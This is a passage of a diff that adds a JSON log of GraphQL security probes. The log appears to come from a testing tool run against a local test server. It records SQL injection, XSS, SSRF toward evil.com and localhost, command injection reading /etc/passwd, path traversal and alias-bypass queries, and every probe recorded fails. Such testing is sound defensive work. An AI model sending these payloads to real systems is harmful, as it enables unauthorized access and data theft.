+    "retry_time_seconds": 0.011,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:55:22.062177Z",
+    "count": 53,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Wallet\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Wallet\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    naame # Intentional typo to trigger a suggestion for 'name'\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:55:24.627690Z",
+    "count": 54,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naame\" on type \"Wallet\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"naame\" on type \"Wallet\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:55:30.241382Z",
+    "count": 55,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123' OR 1=1 --\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-05T16:55:31.850783Z",
+    "count": 56,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"<script>alert('XSS')</script>\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:55:33.445718Z",
+    "count": 57,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"http://evil.com/wallet_data\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:55:36.126154Z",
+    "count": 58,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123; cat /etc/passwd\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:55:38.303928Z",
+    "count": 59,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"../../../../../etc/passwd\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.006,
+    "timestamp": "2025-10-05T16:55:40.550872Z",
+    "count": 60,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"<img src onerror=alert('HTMLi')>\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:55:42.135438Z",
+    "count": 61,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:55:44.414959Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:55:44.420129Z",
+        "response_body": {
+          "data": {
+            "walletAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 62,
+    "timestamp": "2025-10-05T16:55:44.420166Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.017,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery BypassedWalletQuery {\n  walletAlias: getWallet(walletID: \"wallet123\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:55:47.347276Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-05T16:55:47.351287Z",
+        "response_body": {
+          "data": {
+            "walletAlias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 63,
+    "timestamp": "2025-10-05T16:55:47.351308Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.006,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.025,
+    "timestamp": "2025-10-05T16:55:49.418727Z",
+    "count": 64,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Wallet\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Wallet\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getWallet\" argument \"walletID\" of type \"ID!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    naame # Intentional typo to trigger a suggestion for 'name'\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:55:51.856052Z",
+    "count": 65,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"naame\" on type \"Wallet\". Did you mean \"name\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"naame\" on type \"Wallet\". Did you mean \"name\"?",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123\") {\n    id\n    name\n    balance\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:55:57.795318Z",
+    "count": 66,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123' OR 1=1 --\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-05T16:56:00.359654Z",
+    "count": 67,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"<script>alert('XSS')</script>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-05T16:56:03.157805Z",
+    "count": 68,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"http://127.0.0.1:8080/admin\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.005,
+    "timestamp": "2025-10-05T16:56:05.641911Z",
+    "count": 69,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet123; cat /etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-05T16:56:08.147163Z",
+    "count": 70,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"../../etc/passwd\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-05T16:56:09.777043Z",
+    "count": 71,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"<img src=x onerror=alert('HTML_Injection')>\") {\n    id\n    name\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.038,
+    "timestamp": "2025-10-05T16:56:11.775565Z",
+    "count": 72,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getWallet": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet(walletID: \"wallet456\") {\n    id\n    currency {\n      symbol\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-05T16:56:13.903864Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-05T16:56:13.910559Z",
+        "response_body": {
+          "data": {
+            "myWallet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 73,
+    "timestamp": "2025-10-05T16:56:13.910620Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.006,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery WalletAlias {\n  myWallet: getWallet(walletID: \"wallet789\") {\n    id\n    user {\n      firstName\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.003,
+        "timestamp": "2025-10-05T16:56:15.678707Z",
+        "response_body": {
+          "data": {
+            "getWallet": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.004,
+        "timestamp": "2025-10-05T16:56:15.682695Z",
+        "response_body": {
+          "data": {
+            "myWallet": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 74,
+    "timestamp": "2025-10-05T16:56:15.682716Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.006,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getWallet {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.004,
+    "timestamp": "2025-10-05T16:56:18.318613Z",
+    "count": 75,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"types\" on type \"Wallet\".",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"types\" on type \"Wallet\".",
